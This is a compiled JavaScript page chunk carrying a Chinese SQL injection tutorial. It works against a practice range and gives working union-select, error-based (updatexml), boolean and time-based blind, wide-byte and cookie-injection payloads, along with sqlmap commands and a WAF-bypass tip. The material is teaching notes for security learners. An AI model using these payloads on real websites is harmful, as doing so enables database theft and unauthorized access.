(window.webpackJsonp=window.webpackJsonp||[]).push([[23],{299:function(_,v,e){"use strict";e.r(v);var t=e(14),a=Object(t.a)({},(function(){var _=this,v=_._self._c;return v("ContentSlotsDistributor",{attrs:{"slot-key":_.$parent.slotKey}},[v("h2",{attrs:{id:"sql注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#sql注入"}},[_._v("#")]),_._v(" SQL注入")]),_._v(" "),v("p",[_._v("注入攻击的本质，是把用户输入的数据当作代码执行。")]),_._v(" "),v("p",[_._v("这里有两个关键条件")]),_._v(" "),v("ul",[v("li",[_._v("用户能够控制输入")]),_._v(" "),v("li",[_._v("原本程序要执行的代码，拼接了"),v("strong",[_._v("用户输入的数据然后执行")]),_._v("。")])]),_._v(" "),v("p",[_._v("sql注入就是针对sql语句的注入，也可以理解为用户输入的数据当作sql语句的代码执行了")]),_._v(" "),v("p",[_._v("sql注入是1998年一名叫rfp的黑客发表的一篇文章所进入大众视线的")]),_._v(" "),v("h2",{attrs:{id:"试探网页是否存在sql注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#试探网页是否存在sql注入"}},[_._v("#")]),_._v(" 试探网页是否存在sql注入")]),_._v(" "),v("p",[_._v("这里以掌控者的靶场"),v("a",{attrs:{href:"http://pu2lh35s.ia.aqlab.cn/",target:"_blank",rel:"noopener noreferrer"}},[_._v("猫舍"),v("OutboundLink")],1),_._v("为例")]),_._v(" "),v("p",[_._v("在网站的主页面中查看url，可以发现网址栏上有一个"),v("code",[_._v("/?id=1")])]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071635313.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("很明显这是一个get请求，并且需要传递的参数是id")]),_._v(" "),v("p",[_._v("那么尝试一下将id的值改变")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071636375.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("可以看到页面也跟着变了，这说明该网站可能存在sql注入点，因为他在用户输入了以后会执行相应的操作")]),_._v(" "),v("p",[_._v("接下来还要分清楚一个概念")]),_._v(" "),v("p",[_._v("区分"),v("strong",[_._v("字符串")]),_._v("和"),v("strong",[_._v("代码")]),_._v("的区别")]),_._v(" "),v("p",[_._v("字符串不具有代码意义，就是纯文本而代码是会执行的命令")]),_._v(" "),v("p",[_._v("在该网站的url栏中id这个参数还可以以其他方法进行sql注入。")]),_._v(" "),v("p",[_._v("当"),v("code",[_._v("id=1 and 1=1")]),_._v("时，按照代码的逻辑，这个肯定是成立的，提交给浏览器试试看会不会有反应")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071647175.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("可以看到输入以后页面回显正常，那么进一步尝试，当"),v("code",[_._v("id=1 and 1=2")]),_._v("时会怎么样，按照代码逻辑这个是一定会报错的。")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071648756.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("页面的信息消失了且没有回显，现在可以确定该网站存在sql注入")]),_._v(" "),v("p",[_._v("在数据库中所有的id字段数据类型都是整数，但是在查询语句去查询的时候要求id等于一个"),v("code",[_._v("字符串")]),_._v("类型")]),_._v(" "),v("p",[_._v("这个时候它会给我们的字符串进行强制类型转换。在这个过程中，如果输入的id是字母，则全部为0处理")]),_._v(" "),v("p",[_._v("也就是假设"),v("code",[_._v("id=1dawdawdawdwafb")]),_._v("后面无论跟着什么，在强制转换后id都是1后面的会被忽略。这是一个规则不是漏洞。")]),_._v(" "),v("p",[_._v("并且数据库还十分只能，可以直接在url栏来进行加减乘除。")]),_._v(" "),v("p",[_._v("url的中文名是"),v("strong",[_._v("统一资源定位符")]),_._v("他有着自己独特的编码，也就是url编码。而+号在这里面有着特殊的意义，也就是空格的意思")]),_._v(" "),v("p",[_._v("也就是说在url栏中正常输入+号会被当作空格处理，如果想要使用+号必须使用url编码后的+，"),v("code",[_._v("%2b")]),_._v("才能执行+法")]),_._v(" "),v("p",[_._v("还可以使用sleep函数来判断是否存在。")]),_._v(" "),v("p",[_._v("用法就是直接输入sleep(10)也就是叫页面休眠10秒钟再返回数据。")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071705131.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("可以看到页面正在加载。证明我们输入进去的字符被当成命令执行了，这就是显错注入")]),_._v(" "),v("h2",{attrs:{id:"查询数据库字段"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#查询数据库字段"}},[_._v("#")]),_._v(" 查询数据库字段")]),_._v(" "),v("p",[_._v("可以使用"),v("code",[_._v("order by")]),_._v("函数")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071715193.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("这里输入order by 1有回显，证明该页面最有一个字段，那么再试试3.")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071716069.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("这里报错了，说明他小于3个字段，那么再试试2.")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071716690.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("有正常的回显，证明这个页面一共只有2个字段。")]),_._v(" "),v("h2",{attrs:{id:"sql注入查询当前网页的数据库名"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#sql注入查询当前网页的数据库名"}},[_._v("#")]),_._v(" sql注入查询当前网页的数据库名")]),_._v(" "),v("p",[_._v("函数是"),v("code",[_._v("database()")])]),_._v(" "),v("p",[v("span",{staticStyle:{color:"rgb(255, 76, 65)"}},[v("code",[_._v("union")]),_._v(">")]),_._v("要求前后两条SQL语句必须字段相同")]),_._v(" "),v("p",[_._v("在这例题中的用法是这样")]),_._v(" "),v("p",[v("code",[_._v("?id=1 and 1=2 union select 1,database()")]),_._v(" 回车")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071739026.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("可以看到回显数据库名字了")]),_._v(" "),v("p",[v("code",[_._v("?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1")]),_._v("查询当前数据库下的表名")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071741136.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("在大部分情况下管理员账号密码都在admin表里")]),_._v(" "),v("p",[v("code",[_._v("?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin'")])]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071942865.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("这样我们得到了到第一个字段")]),_._v(" "),v("p",[_._v("如果网页有多个字段的话可以引用limit函数。")]),_._v(" "),v("h2",{attrs:{id:"sqlmap"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap"}},[_._v("#")]),_._v(" sqlmap")]),_._v(" "),v("p",[_._v("使用sqlmap可以一把梭，十分轻松的拿到库名")]),_._v(" "),v("p",[_._v("不过sqlmap有分Windows平台的版本还有kali的sqlmap，个人更加建议使用kali，因为更方便使用起来也舒服")]),_._v(" "),v("p",[v("code",[_._v('sqlmap -u "url" --tables --purge')]),_._v("查看当前数据库版本以及字段")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130056038.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("使用"),v("code",[_._v('sqlmap -u "url" --dbs')]),_._v("命令可以直接拿到数据名")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130053223.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("这里附上一个"),v("a",{attrs:{href:"https://www.cnblogs.com/hongfei/p/3872156.html",target:"_blank",rel:"noopener noreferrer"}},[_._v("sqlmap使用手则"),v("OutboundLink")],1)]),_._v(" "),v("h2",{attrs:{id:"联合注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#联合注入"}},[_._v("#")]),_._v(" 联合注入")]),_._v(" "),v("p",[_._v("联合查询语句是 "),v("code",[_._v("union select")])]),_._v(" "),v("p",[_._v("其原理是跟前面的语句拼接例如这样 "),v("code",[_._v("select * from admin union select user,password from admin")])]),_._v(" "),v("p",[_._v("这样才能实现联合查询并且联合查询的前后的字段必须保持一致")]),_._v(" "),v("h2",{attrs:{id:"获取数据库的表名和字段名"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#获取数据库的表名和字段名"}},[_._v("#")]),_._v(" 获取数据库的表名和字段名")]),_._v(" "),v("p",[_._v("通过每一个数据库都会自带的一个  "),v("code",[_._v("information_schema")]),_._v(" 数据库来查询")]),_._v(" "),v("p",[_._v("查询 "),v("code",[_._v("information_schema")]),_._v(" 数据库下面的  "),v("code",[_._v("tables")]),_._v(" 、 "),v("code",[_._v("conlumns")]),_._v(" 两个表来获得")]),_._v(" "),v("h4",{attrs:{id:"tables表里存储的是当前数据库中所有表的信息"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#tables表里存储的是当前数据库中所有表的信息"}},[_._v("#")]),_._v(" tables表里存储的是当前数据库中所有表的信息")]),_._v(" "),v("p",[v("code",[_._v("tables_name")])]),_._v(" "),v("h4",{attrs:{id:"columns表里存储的是当前数据库中的所有字段的信息"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#columns表里存储的是当前数据库中的所有字段的信息"}},[_._v("#")]),_._v(" columns表里存储的是当前数据库中的所有字段的信息")]),_._v(" "),v("p",[v("code",[_._v("columns_name")])]),_._v(" "),v("p",[_._v("还有一个表 "),v("code",[_._v("schema")]),_._v(" 表中存储了所有数据库的信息")]),_._v(" "),v("p",[v("code",[_._v("schema_name")])]),_._v(" "),v("h2",{attrs:{id:"limit的作用"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#limit的作用"}},[_._v("#")]),_._v(" limit的作用")]),_._v(" "),v("p",[_._v("limit 0,1  => 更多是用来分页但还有一种意思，就是从第一行取一条数据")]),_._v(" "),v("p",[_._v("limit 1,1  从第二行取一条数据")]),_._v(" "),v("p",[_._v("limit 1,2  从第二行取两条数据")]),_._v(" "),v("p",[_._v("库>表>字段")]),_._v(" "),v("h2",{attrs:{id:"post注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#post注入"}},[_._v("#")]),_._v(" POST注入")]),_._v(" "),v("p",[_._v("POST注入也有两个关键条件")]),_._v(" "),v("ul",[v("li",[_._v("1、用户能控制输入")]),_._v(" "),v("li",[_._v("2、原本程序要执行的代码，拼接了用户输入的数据。")])]),_._v(" "),v("p",[_._v("POST注入的高危点：")]),_._v(" "),v("ul",[v("li",[_._v("登录框")]),_._v(" "),v("li",[_._v("查询框")]),_._v(" "),v("li",[_._v("等各种和数据库有交互的框")])]),_._v(" "),v("p",[_._v("POST传参和GET类型没有什么区别。")]),_._v(" "),v("p",[_._v("header注入都是在登录后才会产生，因为他只会记录用户，不会记录游客。")]),_._v(" "),v("p",[_._v("插入的语句很可能没有回显")]),_._v(" "),v("p",[_._v("1、盲注(比较复杂)、\n2、报错注入(让数据报错，强行看返回)")]),_._v(" "),v("h2",{attrs:{id:"head注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#head注入"}},[_._v("#")]),_._v(" HEAD注入")]),_._v(" "),v("p",[_._v("安全和用户体验是对立的，用户体验比安全高，所以，不存在没有漏洞的程序。")]),_._v(" "),v("p",[_._v("ip的获取是有讲究的分为")]),_._v(" "),v("p",[_._v("代理")]),_._v(" "),v("ul",[v("li",[_._v("透明代理(目标知道你是谁)")]),_._v(" "),v("li",[_._v("高匿代理(完全不知道是谁在访问)")])]),_._v(" "),v("p",[_._v("而head注入一般是这几种方式")]),_._v(" "),v("ul",[v("li",[_._v("ip")]),_._v(" "),v("li",[_._v("UA")]),_._v(" "),v("li",[_._v("refer")]),_._v(" "),v("li",[_._v("cookie")])]),_._v(" "),v("h2",{attrs:{id:"updatexml函数"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#updatexml函数"}},[_._v("#")]),_._v(" updatexml函数")]),_._v(" "),v("p",[_._v("updatexml()更新xml文档的函数")]),_._v(" "),v("p",[_._v("语法：")]),_._v(" "),v("div",{staticClass:"language- extra-class"},[v("pre",{pre:!0,attrs:{class:"language-text"}},[v("code",[_._v("uodatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\n")])])]),v("blockquote",[v("p",[_._v("实际上这里去更新了xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后会因为不符合输入规则然后报错")])]),_._v(" "),v("p",[_._v("但是报错的时候他其实已经执行了那个子查询代码！")]),_._v(" "),v("blockquote",[v("p",[_._v("0x7e是16进制，MSQL支持16进制，但是开头要写0x，0x7e是一个特殊符号，然后不符合路径规则报错")])]),_._v(" "),v("p",[_._v("用法是"),v("code",[_._v("select updatexml(1,'!a',1)")])]),_._v(" "),v("p",[_._v("这样数据库就会找不到我要的这个东西，会看不懂"),v("code",[_._v("!a")]),_._v("是什么意思就会回显报错")]),_._v(" "),v("p",[v("code",[_._v("concat('!',database())")]),_._v("这行代码的意思就是将"),v("code",[_._v("!")]),_._v("和"),v("code",[_._v("database")]),_._v("的信息连接到一起")]),_._v(" "),v("h2",{attrs:{id:"盲注"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#盲注"}},[_._v("#")]),_._v(" 盲注")]),_._v(" "),v("br"),_._v(" "),v("p",[_._v("盲注所对应的是显错注入，如果服务器关闭了错误回显，这样即使有报错也不会显示，你也不会知道")]),_._v(" "),v("p",[_._v("所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。")]),_._v(" "),v("p",[_._v("服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”。")]),_._v(" "),v("p",[_._v("盲注又分为"),v("code",[_._v("布尔盲注")]),_._v("和"),v("code",[_._v("时间盲注")])]),_._v(" "),v("br"),_._v(" "),v("p",[v("strong",[_._v("布尔盲注")])]),_._v(" "),v("ul",[v("li",[_._v("布尔很明显Ture跟False，也就是说他只会根据你的注入信息返回Ture和False，也就没有了之前的报错信息。")])]),_._v(" "),v("p",[v("strong",[_._v("时间盲注")])]),_._v(" "),v("ul",[v("li",[_._v("界面返回值只有一种，Ture无论输入任何值返回情况都会按照正常的来处理。加入特定的时间函数，通过查看web页面返回的时间来判断注入语句是否正确。")])]),_._v(" "),v("br"),_._v(" "),v("center",[_._v("盲注需要掌握的几个函数")]),_._v(" "),v("br"),_._v(" "),v("table",[v("thead",[v("tr",[v("th",{staticStyle:{"text-align":"center"}},[_._v("函数名")]),_._v(" "),v("th",{staticStyle:{"text-align":"center"}},[_._v("作用")])])]),_._v(" "),v("tbody",[v("tr",[v("td",{staticStyle:{"text-align":"center"}},[_._v("length()")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("返回字符串的长度")])]),_._v(" "),v("tr",[v("td",{staticStyle:{"text-align":"center"}},[_._v("substr()")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("截取字符串(语法:SUBSTR(str,pos,len); )")])]),_._v(" "),v("tr",[v("td",{staticStyle:{"text-align":"center"}},[_._v("ascii()")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("返回字符的ascii码（将字符变成数字wei）")])]),_._v(" "),v("tr",[v("td",{staticStyle:{"text-align":"center"}},[_._v("sleep()")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("将程序挂起一段时间n为n秒")])]),_._v(" "),v("tr",[v("td",{staticStyle:{"text-align":"center"}},[_._v("if(expr1,expr2,expr3)")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("判断语句，如果第一个语句正确就执行第二个语句，如果错误就执行第三个语句")])])])]),_._v(" "),v("br"),_._v(" "),v("p",[_._v("盲注第一个考虑的就是字符串长度")]),_._v(" "),v("p",[v("code",[_._v("and length(database()) >= n")]),_._v("通过这样的函数，不断的更改n的值，就可以判断数据库的库名长度")]),_._v(" "),v("p",[_._v("这里依然以猫舍作为例子")]),_._v(" "),v("p",[_._v("以为之前已经知道了猫舍的库名是maoshe并且长度为6所以可以更加直观的查看结果")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120035354.webp",alt:"Img"}})]),_._v(" "),v("br"),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120036934.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("可以看到当"),v("code",[_._v("length(database()) > 6")]),_._v("时页面就不在出现回显。于是就可以知道他的库名长度为6")]),_._v(" "),v("p",[_._v("知道库名的长度之后，就可以使用"),v("code",[_._v("and ascii(substr(database(),1,1)) > n")]),_._v("来判断每一个字符对应的ASCII码值，以此来得到库名")]),_._v(" "),v("p",[_._v("而一个一个的手动去试字符，很显然这是一个非常耗费时间的事情")]),_._v(" "),v("p",[_._v("所以可以使用工具burpsuite来进行跑包解放双手！")]),_._v(" "),v("p",[_._v("这里依然以猫舍为例")]),_._v(" "),v("p",[_._v("将参数改成"),v("code",[_._v("?id=1 and ascii(substr(database(),1,1))=1")])]),_._v(" "),v("p",[_._v("然后使用burpsuite进行拦截发送至"),v("code",[_._v("Intruder")]),_._v("模块中进行暴力破解")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120049126.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("给我们要改变的值标记一下，设置一下从1开始跑到128(因为ASCII码最多127位)")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120049674.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("跑完以后按照返回的长度来排序，不一样的肯定是有东西的。")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120053835.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("这里可以看到当ASCII值=109的时候返回的长度不一样，109转换成字符串的值就是m。")]),_._v(" "),v("p",[_._v("因为之前已经知道了库名是maoshe了所以可以，所以按照盲注的话，后面的5个字符也可以这样跑")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120056147.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("回到原来选数据的地方，将箭头所指的1改为2，即可跑第二个数据库名。")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120057077.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("通过同样的方法我们又得到了第数据库名字的第二个字符串对应的ASCII码")]),_._v(" "),v("p",[_._v("后面的重复这些操作，直到第六个的时候就可以得到数据库的全名")]),_._v(" "),v("p",[_._v("如果嫌弃速度慢的话其实burpsuite还支持两个数据一起跑")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120102341.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("这样的话就可以一次性最多跑20个变量了")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120101616.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("唯一需要注意的就是要在这里选择每个变量以什么方式跑，跑多大范围就行了")]),_._v(" "),v("p",[v("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120103952.webp",alt:"Img"}})]),_._v(" "),v("p",[_._v("在我们知道数据库名的时候就可以开始跑表名了")]),_._v(" "),v("p",[v("code",[_._v("select table_name from information_schema.tables where table_schema=database() limit 0,1")]),_._v("使用这串命令就可以跑出他的表名了")]),_._v(" "),v("p",[_._v("具体用法是"),v("code",[_._v("?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1")])]),_._v(" "),v("h2",{attrs:{id:"时间注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#时间注入"}},[_._v("#")]),_._v(" 时间注入")]),_._v(" "),v("p",[_._v("使用时间注入的情况就是无论怎么输入，即使让他成功报错了也不存在报错回显的情况下")]),_._v(" "),v("p",[_._v("可以使用函数"),v("code",[_._v("sleep(10)")]),_._v("来测试我输入的语句是否被当成代码执行")]),_._v(" "),v("p",[_._v("如果有被当成代码执行则页面在刷新的时候会进入一个10秒的等待才能成功刷新")]),_._v(" "),v("p",[_._v("这里可以搭配上前面所说的函数"),v("code",[_._v("if(expr1,expr2,expr3)")])]),_._v(" "),v("p",[_._v("这里用一个用法来解释")]),_._v(" "),v("table",[v("thead",[v("tr",[v("th",{staticStyle:{"text-align":"center"}},[_._v("expr1")]),_._v(" "),v("th",{staticStyle:{"text-align":"center"}},[_._v("expr2")]),_._v(" "),v("th",{staticStyle:{"text-align":"center"}},[_._v("expr3")])])]),_._v(" "),v("tbody",[v("tr",[v("td",{staticStyle:{"text-align":"center"}},[_._v("要判断的命令")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("如果判断结果为Ture则执行这个模块的代码")]),_._v(" "),v("td",{staticStyle:{"text-align":"center"}},[_._v("如果判断结果为False则执行这个地方的代码")])])])]),_._v(" "),v("p",[_._v("例如：")]),_._v(" "),v("p",[v("code",[_._v("if(1=1,sleep(10),1)")]),_._v("这句话的意思就是如果1=1成立，则执行"),v("code",[_._v("sleep(10)")]),_._v("让服务器休息10秒，如果1=1不成立则输出1")]),_._v(" "),v("p",[_._v("这是实际用法"),v("code",[_._v('" and if(ascii(substr(database(),1,1))=1,sleep(100),1) --asd')])]),_._v(" "),v("p",[_._v("这样就可以在没有报错回显的情况下依然可以这样得到数据库名字")]),_._v(" "),v("p",[_._v("注意在延时注入时尽量别把延时的只设的太大，这样对服务器的伤害是很大的，如果很多人都延时个几千秒，对服务器资源会造成很大的浪费！")]),_._v(" "),v("h2",{attrs:{id:"宽字节注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#宽字节注入"}},[_._v("#")]),_._v(" 宽字节注入")]),_._v(" "),v("p",[_._v("在实际的sql注入的过程中，如果语句没有被执行，不一定是受到了正则表达式的过滤，还有可能是遇见了魔术引号")]),_._v(" "),v("p",[_._v("它可以将我输入的"),v("code",[_._v("'")]),_._v(" "),v("code",[_._v('"')]),_._v(" "),v("code",[_._v("\\")]),_._v("等用于闭合字符串的字符给使用转义字符转义掉，使无法将语句闭合")]),_._v(" "),v("p",[v("strong",[_._v("常见的应对方式有两种")])]),_._v(" "),v("ul",[v("li",[v("p",[_._v("第一种是使用一些不需要出现单双引号的语句")])]),_._v(" "),v("li",[v("p",[_._v("第二种就是宽字节注入")])]),_._v(" "),v("li",[v("p",[_._v("第三种单引号用0x代替，双引号什么的也可以使用16进制字符代替")])])]),_._v(" "),v("blockquote",[v("p",[_._v("如果要使用宽字节注入，一定要使用非utf-8编码")])]),_._v(" "),v("p",[_._v("宽字节SQL注入主要是源于程序员设置的数据库编码为非英文编码，那么就有可能产生宽字节注入")]),_._v(" "),v("p",[_._v("例如说 MySQL的编码设置为了SET NAMES 'gbk'或是SET character_set_client = gbk,这样的配置会引发编码转换从而导致的注入漏洞")]),_._v(" "),v("blockquote",[v("p",[_._v("宽字节SQL注入就是php发送请求到MySQL时使用了语句SET NAMES 'gbk'或是SET character_set_client = gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节的注入。")])]),_._v(" "),v("p",[_._v("sql注入的方法选用是灵活的，遇见魔术引号无法闭合的时候不一定一定要使用宽字节注入，应当结合其他方法例如HEAD注入权衡之后选择一个最轻松的")]),_._v(" "),v("p",[_._v("在一般情况下POST传参会进行一次编码、后端会进行一次解码")]),_._v(" "),v("p",[_._v("%df => %25df => %df =>字符串的%df")]),_._v(" "),v("p",[_._v("GET传参，url看到了%xx，他不会取管")]),_._v(" "),v("h2",{attrs:{id:"xff-and-refer"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#xff-and-refer"}},[_._v("#")]),_._v(" XFF and Refer")]),_._v(" "),v("p",[_._v("X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项")]),_._v(" "),v("p",[_._v("HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的")]),_._v(" "),v("p",[_._v("并且这两个是可以伪造的")]),_._v(" "),v("p",[_._v("直接在请求包上添加")]),_._v(" "),v("p",[v("code",[_._v("X-Forwarded-For: 123.123.123.123")])]),_._v(" "),v("p",[v("code",[_._v("Referer: https://XXXXX")])]),_._v(" "),v("p",[_._v("就行了")]),_._v(" "),v("h2",{attrs:{id:"access注入-cookie注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#access注入-cookie注入"}},[_._v("#")]),_._v(" Access注入—— Cookie注入")]),_._v(" "),v("p",[_._v("Access => 数据库的一种")]),_._v(" "),v("p",[_._v("POST注入其实是传参的一种")]),_._v(" "),v("p",[_._v("Cookie注入 => 特殊的传参方式产生的注入")]),_._v(" "),v("p",[_._v("Access MySQL mssql(sql server) Oracle")]),_._v(" "),v("p",[_._v("在浏览器中Cookie类似与现实中的门禁卡的意思。")]),_._v(" "),v("blockquote",[v("p",[_._v("Cookie就是代表你身份的一串字符串，网站根据Cookie来识别你是谁。如果你获取了管理员的Cookie，\n你可以无需密码直接登录管理员账户。")])]),_._v(" "),v("ul",[v("li",[_._v("为什么Cookie可以注入？")])]),_._v(" "),v("blockquote",[v("p",[_._v("在动态脚本语言中存在超全局变量可以获取多种传参方式\n很多时候开发在开发的时候为了考虑到多种接受参数，在接受参数的时候都是用多种解释传参的方法")])]),_._v(" "),v("p",[_._v("例如:")]),_._v(" "),v("p",[_._v("php中的"),v("code",[_._v("$_REQUESET[]")]),_._v("可以获取"),v("code",[_._v("POST")]),_._v("|"),v("code",[_._v("GET")]),_._v("|"),v("code",[_._v("COOKIE")]),_._v("传参")]),_._v(" "),v("p",[v("strong",[_._v("注：php5.4以上版本就不会接受Cookie传参了")])]),_._v(" "),v("p",[_._v("如果开发使用了"),v("code",[_._v("$_REQUESET[]")]),_._v("来接受参数。然后我们的"),v("code",[_._v("GET")]),_._v("和"),v("code",[_._v("POST")]),_._v("传参被Waf拦截了怎么办》\n或许Waf没有对"),v("code",[_._v("Cookie")]),_._v("进行检测。使用"),v("code",[_._v("Cookie")]),_._v("进行传参就可以绕过检测机制。")]),_._v(" "),v("p",[v("strong",[_._v("设置Cookie")])]),_._v(" "),v("ul",[v("li",[_._v("1、在浏览器中通过按F12来进行设置")]),_._v(" "),v("li",[_._v("2、抓包直接修改")]),_._v(" "),v("li",[_._v("3、浏览器有的插件也可以设置Cookie")]),_._v(" "),v("li",[_._v("浏览器自带的js进行设置")]),_._v(" "),v("li",[_._v("document.cookie是查看当前id")]),_._v(" "),v("li",[_._v("document.cookie=是赋值")])]),_._v(" "),v("h3",{attrs:{id:"使用cookie传参"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#使用cookie传参"}},[_._v("#")]),_._v(" 使用Cookie传参")]),_._v(" "),v("p",[_._v("在浏览器中有时会将and之类的sql语句给屏蔽了")]),_._v(" "),v("p",[_._v("所以有拦截就得绕过")]),_._v(" "),v("ul",[v("li",[_._v("不让他检测到")]),_._v(" "),v("li",[_._v("规避规则")])]),_._v(" "),v("p",[_._v("它可以接受Cookie传参并且拼接进数据库。Cookie很多时候都需要URL编码")]),_._v(" "),v("p",[_._v("Access是很老的数据库 => 他不是数据库只是表的集合，他不存在库，只有表和字段")]),_._v(" "),v("p",[_._v("select 1,2,3,4,5,6,7,8,9 => MySQL")]),_._v(" "),v("p",[_._v("在Access数据库中可以使用and exists(select*from 表名)来查询")]),_._v(" "),v("p",[_._v("什么网站存在Cookie注入")]),_._v(" "),v("ul",[v("li",[_._v("1、ASP的站点存在肯能性极高")]),_._v(" "),v("li",[_._v("PHP版本低于5.3版本的可能性极高")])]),_._v(" "),v("p",[_._v("不要陷入思维误区")]),_._v(" "),v("br"),_._v(" "),v("h2",{attrs:{id:"偏移注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#偏移注入"}},[_._v("#")]),_._v(" 偏移注入")]),_._v(" "),v("p",[_._v("爆破其实就是使用字典一个一个的去试，如果遇上一些很奇葩的表名基本上就是无解了")]),_._v(" "),v("p",[_._v("偏移注入其实叫"),v("code",[_._v("位移注入")])]),_._v(" "),v("p",[_._v("字段名.表.字段 => 选择x库中的x字段")]),_._v(" "),v("p",[v("code",[_._v("select *from admin")]),_._v(" => "),v("code",[_._v("select id, uesername, password from admin")])]),_._v(" "),v("p",[v("code",[_._v("select admin.* from admin")]),_._v(" =>")]),_._v(" "),v("p",[_._v("admin.* 代表了admin表里的所有字段")]),_._v(" "),v("p",[_._v("所以表名.* = > 表里的所有字段")]),_._v(" "),v("p",[v("code",[_._v("select*from news where id=1 union select admin.* from admin")])]),_._v(" "),v("p",[_._v("union => 要求前后两条执行的SQL语句字段数必须相同")]),_._v(" 